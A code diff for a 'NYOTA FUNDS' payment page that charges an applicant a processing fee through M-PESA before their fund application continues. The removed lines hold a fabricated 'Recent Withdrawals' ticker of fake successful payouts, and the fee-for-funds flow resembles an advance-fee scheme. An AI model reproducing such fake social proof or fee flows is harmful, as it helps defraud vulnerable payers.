@@ -1,1028 +1,367 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
+<!DOCTYPE html><html lang="en"><head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>NYOTA FUNDS</title>
-
-<style>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NYOTA FUNDS</title><style>
 @import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
 
-*{
-    box-sizing:border-box;
+* {
+    box-sizing: border-box;
 }
 
-html,body{
-    margin:0;
-    padding:0;
-    width:100%;
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
 }
 
-body{
-    padding:10px;
-    font-family:'Mali',sans-serif;
-    background:#0B0217;
-    color:#fff;
+body {
+    padding: 10px;
+    font-family: 'Mali', sans-serif;
+    background: #0B0217;
+    color: #fff;
 }
 
-.container{
-    width:100%;
-    max-width:430px;
-    margin:0 auto;
+.container {
+    width: 100%;
+    max-width: 430px;
+    margin: 0 auto;
 }
 
-/* =================================
-   PAYMENT CARD
-================================= */
+/* PAYMENT CARD */
 
-.card{
-    width:100%;
-
-    background:
-        linear-gradient(
-            145deg,
-            rgba(255,255,255,0.09),
-            rgba(255,255,255,0.035)
-        );
-
-    padding:16px 16px 14px;
-
-    border-radius:18px;
-
+.card {
+    width: 100%;
+    background: linear-gradient(
+        145deg,
+        rgba(255,255,255,0.09),
+        rgba(255,255,255,0.035)
+    );
+    padding: 16px 16px 14px;
+    border-radius: 18px;
     box-shadow:
         0 20px 60px rgba(0,0,0,0.45),
         inset 0 1px 0 rgba(255,255,255,0.05);
-
-    border:1px solid rgba(255,255,255,0.10);
+    border: 1px solid rgba(255,255,255,0.10);
 }
 
-h1{
-    text-align:center;
-    color:#D4AF37;
-    font-size:21px;
-    font-weight:700;
-    margin:0 0 8px;
+h1 {
+    text-align: center;
+    color: #D4AF37;
+    font-size: 21px;
+    font-weight: 700;
+    margin: 0 0 8px;
 }
 
-p{
-    text-align:center;
-    font-size:12px;
-    line-height:1.35;
-    color:rgba(255,255,255,0.72);
-    margin:7px 0;
+p {
+    text-align: center;
+    font-size: 12px;
+    line-height: 1.35;
+    color: rgba(255,255,255,0.72);
+    margin: 7px 0;
 }
 
-.amount{
-    background:rgba(212,175,55,0.055);
-    border:1px solid rgba(212,175,55,0.25);
-
-    border-radius:12px;
-
-    padding:11px 10px;
-
-    font-size:18px;
-    font-weight:700;
-
-    text-align:center;
-
-    color:#fff;
-
-    margin:10px 0;
+.amount {
+    background: rgba(212,175,55,0.055);
+    border: 1px solid rgba(212,175,55,0.25);
+    border-radius: 12px;
+    padding: 11px 10px;
+    font-size: 18px;
+    font-weight: 700;
+    text-align: center;
+    color: #fff;
+    margin: 10px 0;
 }
 
-label{
-    display:block;
-
-    margin-top:8px;
-    margin-bottom:5px;
-
-    font-size:12px;
-    font-weight:700;
-
-    color:rgba(255,255,255,0.88);
+label {
+    display: block;
+    margin-top: 8px;
+    margin-bottom: 5px;
+    font-size: 12px;
+    font-weight: 700;
+    color: rgba(255,255,255,0.88);
 }
 
-input{
-    width:100%;
-    height:48px;
-
-    padding:0 12px;
-
-    border:1px solid rgba(255,255,255,0.12);
-
-    border-radius:10px;
-
-    font-size:15px;
-
-    font-family:'Mali',sans-serif;
-
-    background:rgba(255,255,255,0.07);
-
-    color:#fff;
-
-    outline:none;
+input {
+    width: 100%;
+    height: 48px;
+    padding: 0 12px;
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 10px;
+    font-size: 15px;
+    font-family: 'Mali', sans-serif;
+    background: rgba(255,255,255,0.07);
+    color: #fff;
+    outline: none;
 }
 
-input:focus{
-    border-color:rgba(212,175,55,0.8);
-
-    box-shadow:
-        0 0 0 3px rgba(212,175,55,0.10);
+input:focus {
+    border-color: rgba(212,175,55,0.8);
+    box-shadow: 0 0 0 3px rgba(212,175,55,0.10);
 }
 
-/* =================================
-   PAY PROCESSING FEE BUTTON
-================================= */
+/* PAYMENT BUTTON */
 
-button{
-    width:100%;
-
-    height:54px;
-
-    padding:0 15px;
-
-    margin:12px 0;
-
-    background:
-        linear-gradient(
-            135deg,
-            #D4AF37,
-            #A67C00
-        );
-
-    color:#0B0217;
-
-    border:none;
-
-    border-radius:11px;
-
-    font-family:'Mali',sans-serif;
-
-    font-size:15px;
-
-    font-weight:700;
-
-    cursor:pointer;
-
-    display:flex;
-
-    align-items:center;
-
-    justify-content:center;
-
+button {
+    width: 100%;
+    height: 54px;
+    padding: 0 15px;
+    margin: 12px 0;
+    background: linear-gradient(135deg, #D4AF37, #A67C00);
+    color: #0B0217;
+    border: none;
+    border-radius: 11px;
+    font-family: 'Mali', sans-serif;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
     box-shadow:
         0 10px 30px rgba(212,175,55,0.20),
         inset 0 1px 0 rgba(255,255,255,0.55);
 }
 
-button:hover{
-    background:
-        linear-gradient(
-            135deg,
-            #D4AF37,
-            #A67C00
-        );
+button:active {
+    transform: scale(.98);
 }
 
-button:active{
-    transform:scale(.98);
+button:disabled {
+    background: rgba(255,255,255,0.25);
+    color: #fff;
+    cursor: not-allowed;
+    box-shadow: none;
 }
 
-button:disabled{
-    background:rgba(255,255,255,0.25);
-    color:#fff;
-
-    cursor:not-allowed;
-
-    box-shadow:none;
+#stkMessage {
+    min-height: 18px;
+    margin: 2px 0 0;
+    color: #D4AF37;
+    font-size: 11px;
+    font-weight: 600;
+    line-height: 1.4;
 }
 
-#stkMessage{
-    min-height:18px;
+/* CUSTOMER FEEDBACK */
 
-    margin:2px 0 0;
-
-    color:#D4AF37;
-
-    font-size:11px;
-
-    font-weight:600;
-
-    line-height:1.4;
+.live-comments {
+    width: 100%;
+    margin-top: 12px;
+    background: #1D293B;
+    border-radius: 24px;
+    padding: 16px 10px 15px;
+    overflow: hidden;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.45);
 }
 
-
-/* =================================
-   PROCESSING FEE CARD
-================================= */
-
-.processing-fee-card{
-    width:100%;
-
-    box-sizing:border-box;
-
-    padding:45px 30px;
-
-    display:flex;
-
-    flex-direction:column;
-
-    justify-content:center;
+.comments-title {
+    text-align: center;
+    font-size: 18px;
+    font-weight: 700;
+    color: #fff;
+    margin: 0 0 12px;
 }
 
-.processing-fee-card .fee-amount{
-    width:100%;
-
-    box-sizing:border-box;
-
-    padding:25px 20px;
-
-    text-align:center;
+.comments-window {
+    height: 360px;
+    overflow: hidden;
+    position: relative;
 }
 
-.processing-fee-card input{
-    width:100%;
-
-    box-sizing:border-box;
-
-    height:85px;
-
-    padding:0 20px;
+.comments-track {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    animation: commentsFlow 35s linear infinite;
 }
 
-.processing-fee-card button{
-    width:100%;
-
-    height:88px;
-
-    min-height:88px;
-
-    padding:0 20px;
-
-    box-sizing:border-box;
-
-    display:flex;
-
-    align-items:center;
-
-    justify-content:center;
+.comments-window:active .comments-track {
+    animation-play-state: paused;
 }
 
-.processing-fee-card > *{
-    margin-top:12px;
-
-    margin-bottom:12px;
+.comment {
+    min-height: 92px;
+    background: #020617;
+    border-radius: 19px;
+    border-left: 6px solid #D4AF37;
+    padding: 13px 12px;
+    flex-shrink: 0;
 }
 
-.processing-fee-card > *:first-child{
-    margin-top:0;
+.comment-name {
+    font-size: 14px;
+    font-weight: 700;
+    color: #D4AF37;
+    margin-bottom: 5px;
 }
 
-.processing-fee-card > *:last-child{
-    margin-bottom:0;
+.comment-message {
+    font-size: 12px;
+    line-height: 1.5;
+    color: #fff;
 }
 
-
-/* =================================
-   RECENT WITHDRAWALS
-================================= */
-
-.activity-box{
-
-    width:100%;
-
-    margin-top:12px;
-
-    background:#1D293B;
-
-    border-radius:24px;
-
-    padding:16px 10px 15px;
-
-    overflow:hidden;
-
-    box-shadow:
-        0 20px 60px rgba(0,0,0,0.45);
+.comment-time {
+    font-size: 10px;
+    color: rgba(255,255,255,0.55);
+    margin-top: 5px;
 }
 
-.activity-title{
-
-    text-align:center;
-
-    font-size:18px;
-
-    font-weight:700;
-
-    color:#fff;
-
-    margin:0 0 12px;
+@keyframes commentsFlow {
+    from {
+        transform: translateY(0);
+    }
+    to {
+        transform: translateY(-50%);
+    }
 }
 
-.activity-title span{
-    margin-right:6px;
-}
+/* MOBILE */
 
-.activity-window{
-
-    height:360px;
-
-    overflow:hidden;
-
-    position:relative;
-}
-
-.activity-track{
-
-    display:flex;
-
-    flex-direction:column;
-
-    gap:10px;
-
-    animation:
-        scrollActivity
-        35s
-        linear
-        infinite;
-}
-
-.activity-window:active .activity-track{
-    animation-play-state:paused;
-}
-
-
-/* =================================
-   WITHDRAWAL CARD
-================================= */
-
-.activity-item{
-
-    min-height:92px;
-
-    background:#020617;
-
-    border-radius:19px;
-
-    border-left:6px solid #D4AF37;
-
-    display:flex;
-
-    align-items:center;
-
-    justify-content:space-between;
-
-    padding:13px 12px;
-
-    flex-shrink:0;
-}
-
-.activity-info{
-
-    display:flex;
-
-    flex-direction:column;
-
-    gap:4px;
-
-    min-width:0;
-}
-
-.activity-phone{
-
-    font-size:14px;
-
-    font-weight:600;
-
-    color:#fff;
-}
-
-.activity-amount{
-
-    font-size:14px;
-
-    font-weight:600;
-
-    color:#fff;
-}
-
-.activity-time{
-
-    font-size:11px;
-
-    color:rgba(255,255,255,0.55);
-}
-
-.activity-status{
-
-    background:rgba(212,175,55,0.15);
-
-    color:#D4AF37;
-
-    border-radius:40px;
-
-    padding:9px 9px;
-
-    font-size:9px;
-
-    font-weight:700;
-
-    white-space:nowrap;
-
-    text-align:center;
-
-    margin-left:7px;
-}
-
-
-/* =================================
-   CONTINUOUS SCROLL
-================================= */
-
-@keyframes scrollActivity{
-
-    0%{
-        transform:translateY(0);
+@media(max-width:360px) {
+    body {
+        padding: 7px;
     }
 
-    100%{
-        transform:translateY(-50%);
+    .card {
+        padding: 14px 12px 12px;
+        border-radius: 15px;
     }
 
+    h1 {
+        font-size: 19px;
+    }
+
+    p {
+        font-size: 11px;
+    }
+
+    .amount {
+        font-size: 17px;
+        padding: 10px;
+    }
+
+    input {
+        height: 46px;
+        font-size: 14px;
+    }
+
+    button {
+        height: 52px;
+        font-size: 14px;
+        margin: 10px 0;
+    }
+
+    .live-comments {
+        margin-top: 10px;
+        padding: 14px 8px;
+        border-radius: 21px;
+    }
+
+    .comments-title {
+        font-size: 17px;
+        margin-bottom: 10px;
+    }
+
+    .comments-window {
+        height: 330px;
+    }
+
+    .comment {
+        min-height: 86px;
+        padding: 12px 9px;
+        border-radius: 18px;
+    }
+
+    .comment-name {
+        font-size: 13px;
+    }
+
+    .comment-message {
+        font-size: 11px;
+    }
+
+    .comment-time {
+        font-size: 10px;
+    }
 }
-
-
-/* =================================
-   MOBILE
-================================= */
-
-@media(max-width:360px){
-
-    body{
-        padding:7px;
-    }
-
-    .card{
-        padding:14px 12px 12px;
-
-        border-radius:15px;
-    }
-
-    h1{
-        font-size:19px;
-    }
-
-    p{
-        font-size:11px;
-    }
-
-    .amount{
-        font-size:17px;
-
-        padding:10px;
-    }
-
-    input{
-        height:46px;
-
-        font-size:14px;
-    }
-
-    button{
-        height:52px;
-
-        font-size:14px;
-
-        margin:10px 0;
-    }
-
-    .activity-box{
-
-        margin-top:10px;
-
-        padding:14px 8px;
-
-        border-radius:21px;
-    }
-
-    .activity-title{
-        font-size:17px;
-
-        margin-bottom:10px;
-    }
-
-    .activity-window{
-        height:330px;
-    }
-
-    .activity-item{
-
-        min-height:86px;
-
-        padding:12px 9px;
-
-        border-radius:18px;
-    }
-
-    .activity-phone{
-        font-size:13px;
-    }
-
-    .activity-amount{
-        font-size:13px;
-    }
-
-    .activity-time{
-        font-size:10px;
-    }
-
-    .activity-status{
-
-        padding:8px 7px;
-
-        font-size:8px;
-    }
-
-}
-
-</style>
-
-</head>
-
-
-<body>
-
-<div class="container">
-
-
-<!-- =================================
-     PAYMENT SECTION
-================================= -->
+</style></head><body>
+<div class="container"><!-- PAYMENT SECTION -->
 
 <div class="card">
+    <h1>PROCESSING FEE</h1>
 
-<h1>PROCESSING FEE</h1>
+    <p>
+        Welcome, <strong><span id="name"></span></strong>
+    </p>
 
-<p>
-Welcome, <strong><span id="name"></span></strong>
-</p>
+    <p>
+        To continue with your NYOTA Fund application, please complete the processing fee payment below.
+    </p>
 
-<p>
-To continue with your NYOTA Fund application, please complete the processing fee payment below.
-</p>
+    <div class="amount" id="feeAmount">
+        Processing Fee: KSh 350
+    </div>
 
-<div class="amount" id="feeAmount">
-Processing Fee: KSh 350
-</div>
-
-
-<label>Full Name</label>
-
-<input
-    type="text"
-    id="fullName"
-    readonly
->
-
-
-<label>M-PESA Phone Number</label>
-
-<input
-    type="tel"
-    id="phone"
-    placeholder="2547XXXXXXXX"
->
-
-
-<button
-    id="payBtn"
-    onclick="payNow()"
->
-    Pay Processing Fee
-</button>
-
-
-<p id="stkMessage"></p>
-
-</div>
-
-
-<!-- =================================
-     RECENT WITHDRAWALS
-================================= -->
-
-<div class="activity-box">
-
-<div class="activity-title">
-<span>📊</span>
-Recent Withdrawals
-</div>
-
-<div class="activity-window">
-
-<div class="activity-track">
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0702****5</div>
-<div class="activity-amount">KSh. 150,000</div>
-<div class="activity-time">5 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0115****0</div>
-<div class="activity-amount">KSh. 110,000</div>
-<div class="activity-time">4 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0757****0</div>
-<div class="activity-amount">KSh. 85,000</div>
-<div class="activity-time">4 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0722****9</div>
-<div class="activity-amount">KSh. 75,000</div>
-<div class="activity-time">3 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0719****7</div>
-<div class="activity-amount">KSh. 65,000</div>
-<div class="activity-time">3 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0749****6</div>
-<div class="activity-amount">KSh. 50,000</div>
-<div class="activity-time">2 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0791****3</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">2 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0708****1</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">1 minute ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0728****4</div>
-<div class="activity-amount">KSh. 22,000</div>
-<div class="activity-time">59 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0712****8</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">52 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0798****2</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">45 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0705****9</div>
-<div class="activity-amount">KSh. 50,000</div>
-<div class="activity-time">38 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0740****5</div>
-<div class="activity-amount">KSh. 65,000</div>
-<div class="activity-time">31 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0725****6</div>
-<div class="activity-amount">KSh. 75,000</div>
-<div class="activity-time">24 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0710****4</div>
-<div class="activity-amount">KSh. 85,000</div>
-<div class="activity-time">18 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0786****1</div>
-<div class="activity-amount">KSh. 110,000</div>
-<div class="activity-time">12 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0701****8</div>
-<div class="activity-amount">KSh. 150,000</div>
-<div class="activity-time">8 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0733****2</div>
-<div class="activity-amount">KSh. 22,000</div>
-<div class="activity-time">5 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0772****7</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">3 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0750****3</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">2 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-
-<!-- DUPLICATE SET FOR CONTINUOUS SCROLL -->
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0702****5</div>
-<div class="activity-amount">KSh. 150,000</div>
-<div class="activity-time">5 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0115****0</div>
-<div class="activity-amount">KSh. 110,000</div>
-<div class="activity-time">4 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0757****0</div>
-<div class="activity-amount">KSh. 85,000</div>
-<div class="activity-time">4 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0722****9</div>
-<div class="activity-amount">KSh. 75,000</div>
-<div class="activity-time">3 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0719****7</div>
-<div class="activity-amount">KSh. 65,000</div>
-<div class="activity-time">3 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+    <label>Full Name</label>
+    <input type="text" id="fullName" readonly>
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0749****6</div>
-<div class="activity-amount">KSh. 50,000</div>
-<div class="activity-time">2 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0791****3</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">2 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0708****1</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">1 minute ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0728****4</div>
-<div class="activity-amount">KSh. 22,000</div>
-<div class="activity-time">59 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0712****8</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">52 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+    <label>M-PESA Phone Number</label>
+    <input type="tel" id="phone" placeholder="2547XXXXXXXX">
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0798****2</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">45 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0705****9</div>
-<div class="activity-amount">KSh. 50,000</div>
-<div class="activity-time">38 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+    <button id="payBtn" onclick="payNow()">
+        Pay Processing Fee
+    </button>
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0740****5</div>
-<div class="activity-amount">KSh. 65,000</div>
-<div class="activity-time">31 seconds ago</div>
+    <p id="stkMessage"></p>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0725****6</div>
-<div class="activity-amount">KSh. 75,000</div>
-<div class="activity-time">24 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+<!-- CUSTOMER FEEDBACK -->
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0710****4</div>
-<div class="activity-amount">KSh. 85,000</div>
-<div class="activity-time">18 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+<div class="live-comments">
+    <div class="comments-title">
+        💬 Customer Feedback
+    </div>
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0786****1</div>
-<div class="activity-amount">KSh. 110,000</div>
-<div class="activity-time">12 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+    <div class="comments-window">
+        <div class="comments-track">
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0701****8</div>
-<div class="activity-amount">KSh. 150,000</div>
-<div class="activity-time">8 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+            <!-- Add genuine, permissioned customer feedback here.
+                 Do not display unverified payout claims as confirmed transactions. -->
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0733****2</div>
-<div class="activity-amount">KSh. 22,000</div>
-<div class="activity-time">5 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+            <div class="comment">
+                <div class="comment-name">Customer feedback</div>
+                <div class="comment-message">Customer feedback will appear here.</div>
+                <div class="comment-time">Feedback section</div>
+            </div>
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0772****7</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">3 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+            <div class="comment">
+                <div class="comment-name">Customer feedback</div>
+                <div class="comment-message">Only verified and permissioned feedback should be displayed.</div>
+                <div class="comment-time">Feedback section</div>
+            </div>
 
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0750****3</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">2 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
+            <!-- Duplicate entries to maintain continuous scrolling -->
 
+            <div class="comment">
+                <div class="comment-name">Customer feedback</div>
+                <div class="comment-message">Customer feedback will appear here.</div>
+                <div class="comment-time">Feedback section</div>
+            </div>
 
-</div>
-</div>
-</div>
+            <div class="comment">
+                <div class="comment-name">Customer feedback</div>
+                <div class="comment-message">Only verified and permissioned feedback should be displayed.</div>
+                <div class="comment-time">Feedback section</div>
+            </div>
 
+        </div>
+    </div>
 </div>
-
-
-<script>
 
-/* =========================================
-   LOAD APPLICANT NAME
-========================================= */
+</div><script>
+/* LOAD APPLICANT NAME */
 
-let applicant =
-    localStorage.getItem("applicantName");
+let applicant = localStorage.getItem("applicantName");
 
 document.getElementById("name").innerHTML =
     applicant || "Applicant";
@@ -1031,9 +370,7 @@ document.getElementById("fullName").value =
     applicant || "";
 
 
-/* =========================================
-   LOAD PROCESSING FEE
-========================================= */
+/* LOAD PROCESSING FEE */
 
 let processingFee =
     localStorage.getItem("processingFee") || "350";
@@ -1043,247 +380,138 @@ document.getElementById("feeAmount").innerHTML =
     Number(processingFee).toLocaleString();
 
 
-/* =========================================
-   START STK PUSH
-========================================= */
+/* START STK PUSH */
 
-async function payNow(){
+async function payNow() {
+    let phone = document.getElementById("phone").value.trim();
 
-    let phone =
-        document.getElementById("phone").value.trim();
-
-    if(phone === ""){
-
-        alert(
-            "Please enter your M-PESA phone number."
-        );
-
+    if (phone === "") {
+        alert("Please enter your M-PESA phone number.");
         return;
     }
 
-    localStorage.setItem(
-        "phoneNumber",
-        phone
-    );
+    localStorage.setItem("phoneNumber", phone);
 
     localStorage.setItem(
         "fullName",
         document.getElementById("fullName").value
     );
 
-    let btn =
-        document.getElementById("payBtn");
+    let btn = document.getElementById("payBtn");
 
-    btn.innerHTML =
-        "Sending STK Push...";
-
+    btn.innerHTML = "Sending STK Push...";
     btn.disabled = true;
 
-    try{
-
+    try {
         let response = await fetch(
             "https://nyota-funds-backend.onrender.com/stk-push",
             {
-                method:"POST",
-
-                headers:{
-                    "Content-Type":
-                        "application/json"
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
                 },
-
-                body:JSON.stringify({
-
-                    phone:phone,
-
-                    amount:
-                        Number(processingFee)
-
+                body: JSON.stringify({
+                    phone: phone,
+                    amount: Number(processingFee)
                 })
             }
         );
 
-        let data =
-            await response.json();
+        let data = await response.json();
 
-        console.log(
-            "STK RESPONSE:",
-            data
-        );
+        console.log("STK RESPONSE:", data);
 
-        if(
-            !response.ok ||
-            !data.success
-        ){
-
-            throw new Error(
-                data.message ||
-                "STK Push failed"
-            );
+        if (!response.ok || !data.success) {
+            throw new Error(data.message || "STK Push failed");
         }
 
         let transactionId =
             data.transactionId ||
             data.checkout_request_id;
 
-        if(!transactionId){
-
-            throw new Error(
-                "No Paylor transaction ID received"
-            );
+        if (!transactionId) {
+            throw new Error("No Paylor transaction ID received");
         }
 
-        btn.innerHTML =
-            "Processing...";
+        btn.innerHTML = "Processing...";
 
-        document.getElementById(
-            "stkMessage"
-        ).innerHTML =
+        document.getElementById("stkMessage").innerHTML =
             "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";
 
-        checkPayment(
-            transactionId
-        );
+        checkPayment(transactionId);
 
-    }catch(error){
+    } catch (error) {
+        console.log("PAYMENT ERROR:", error);
 
-        console.log(
-            "PAYMENT ERROR:",
-            error
-        );
+        alert(error.message || "Payment request failed.");
 
-        alert(
-            error.message ||
-            "Payment request failed."
-        );
-
-        btn.innerHTML =
-            "Pay Processing Fee";
-
+        btn.innerHTML = "Pay Processing Fee";
         btn.disabled = false;
     }
 }
 
 
-/* =========================================
-   CHECK PAYMENT STATUS
-========================================= */
+/* CHECK PAYMENT STATUS */
 
-async function checkPayment(
-    transactionId
-){
-
-    let interval =
-        setInterval(async()=>{
-
-            try{
-
-                let response =
-                    await fetch(
-                        "https://nyota-funds-backend.onrender.com/payment-status",
-                        {
-                            method:"POST",
-
-                            headers:{
-                                "Content-Type":
-                                    "application/json"
-                            },
-
-                            body:JSON.stringify({
-
-                                transactionId:
-                                    transactionId
-
-                            })
-                        }
-                    );
-
-                let result =
-                    await response.json();
-
-                console.log(
-                    "PAYMENT STATUS:",
-                    result
-                );
-
-                if(
-                    !result.success ||
-                    !result.data
-                ){
-
-                    return;
+async function checkPayment(transactionId) {
+    let interval = setInterval(async () => {
+        try {
+            let response = await fetch(
+                "https://nyota-funds-backend.onrender.com/payment-status",
+                {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        transactionId: transactionId
+                    })
                 }
+            );
 
-                let payment =
-                    result.data;
+            let result = await response.json();
 
-                let status =
-                    String(
-                        payment.status || ""
-                    ).toUpperCase();
+            console.log("PAYMENT STATUS:", result);
 
-
-                /* PAYMENT SUCCESS */
-
-                if(
-                    status === "COMPLETED"
-                ){
-
-                    clearInterval(
-                        interval
-                    );
-
-                    document.getElementById(
-                        "stkMessage"
-                    ).innerHTML =
-                        "✅ Payment successful. Redirecting...";
-
-                    window.location.href =
-                        "delivery.html";
-                }
-
-
-                /* PAYMENT FAILED */
-
-                else if(
-                    status === "CANCELLED" ||
